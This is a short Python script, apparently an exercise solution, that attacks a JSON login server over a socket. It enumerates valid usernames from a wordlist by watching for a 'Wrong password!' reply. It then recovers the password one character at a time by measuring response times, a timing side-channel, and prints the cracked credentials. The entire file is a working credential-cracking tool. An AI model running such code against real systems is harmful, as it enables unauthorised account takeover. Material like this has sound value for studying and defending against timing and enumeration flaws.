import socket
import argparse
import json
from string import ascii_letters, digits
import time


def main():
    with open("logins.txt") as file:
        login_dict = list(map(lambda x: x.strip(), file.readlines()))

    with socket.socket() as client_sock:
        address = (args.ip_address, args.port)

        client_sock.connect(address)

        for login in login_dict:
            login_password = json.dumps({"login": login, "password": ""})
            client_sock.send(login_password.encode())
            response = client_sock.recv(1024)
            response = response.decode()

            if response == json.dumps({"result": "Wrong password!"}):
                found_login = login
                break

        send_receive(client_sock, found_login)


def send_receive(client, login):
    characters = "".join(ascii_letters + digits)
    password = ""
    message = json.dumps({"login": login, "password": ""})
    client.send(message.encode())

    start = time.time_ns()
    client.recv(1024)
    end = time.time_ns()

    wrong_password_time = end - start

    while True:
        for char in characters:
            message = json.dumps({"login": login, "password": password + char})
            client.send(message.encode())

            start = time.time_ns()
            response = client.recv(1024)
            end = time.time_ns()

            processing_time = end - start
            response = response.decode()

            if response == json.dumps({"result": "Connection success!"}):
                password += char
                print(json.dumps({"login": login, "password": password}))
                return
            elif processing_time > wrong_password_time:
                password += char
                break


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('ip_address', type=str, help='IP address')
    parser.add_argument('port', type=int, help='port number')
    args = parser.parse_args()

    main()
